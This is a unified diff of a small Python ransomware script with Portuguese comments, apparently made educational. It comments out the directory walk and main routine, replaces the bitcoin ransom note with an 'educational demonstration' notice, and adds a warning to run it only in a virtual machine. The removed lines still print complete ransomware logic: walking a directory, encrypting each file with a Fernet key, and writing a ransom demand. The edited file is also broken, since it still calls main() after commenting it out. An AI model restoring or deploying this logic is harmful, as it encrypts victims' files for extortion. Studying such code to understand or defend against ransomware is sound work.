@@ -1,6 +1,8 @@
 from cryptography.fernet import Fernet
 import os
 
+# Não utilize este código para fins maliciosos e jamais o execute fora de uma máquina virtual. Algumas partes foram comentadas por questões de segurança.
+
 #1. Gerar uma chave de criptografia e salvar
 def gerar_chave():
     chave = Fernet.generate_key()
@@ -21,31 +23,32 @@ def criptografar_arquivo(arquivo, chave):
         file.write(dados_encriptados)
 
 #4. Encontrar arquivos para criptografar
-def encontrar_arquivos(diretorio):
-    lista = []
-    for raiz, _, arquivos in os.walk(diretorio):
-        for nome in arquivos:
-            caminho = os.path.join(raiz, nome)
-            if nome != "ransomware.py" and not nome.endswith(".key"):
-                lista.append(caminho)
-    return lista
+#def encontrar_arquivos(diretorio):
+    #lista = []
+    #for raiz, _, arquivos in os.walk(diretorio):
+        #for nome in arquivos:
+            #caminho = os.path.join(raiz, nome)
+            #if nome != "ransomware.py" and not nome.endswith(".key"):
+                #lista.append(caminho)
+    #return lista
 
 #5. Mensagem de resgate
 def criar_mensagem_resgate():
     with open("LEIA_ISSO.txt", "w") as f:
-        f.write("Seus arquivos foram criptografados!\n")
-        f.write("Envie 1 bitcoin para o endereco X e envie o comprovante!\n")
-        f.write("Depois disso enviaremos a chave para voce recuperar seus dados!")
+        f.write("DEMONSTRAÇÃO EDUCACIONAL\n")
+        f.write("Este é um projeto seguro de estudo sobre como ransomwares funcionam.\n")
+        f.write("Nenhum pagamento é necessário. Não use este código para fins maliciosos.")
 
 #6. Execução principal
-def main():
-    gerar_chave()
-    chave = carregar_chave()
-    arquivos = encontrar_arquivos("test_files")
-    for arquivo in arquivos:
-        criptografar_arquivo(arquivo, chave)
-    criar_mensagem_resgate()
-    print("Ransomware executado! Arquivos criptografados!")
+#def main():
+    #gerar_chave()
+    #chave = carregar_chave()
+    #arquivos = encontrar_arquivos("test_files")
+    #for arquivo in arquivos:
+        #criptografar_arquivo(arquivo, chave)
+    #criar_mensagem_resgate()
+    #print("Ransomware executado! Arquivos criptografados!")
 
 if __name__=="__main__":
+
     main()
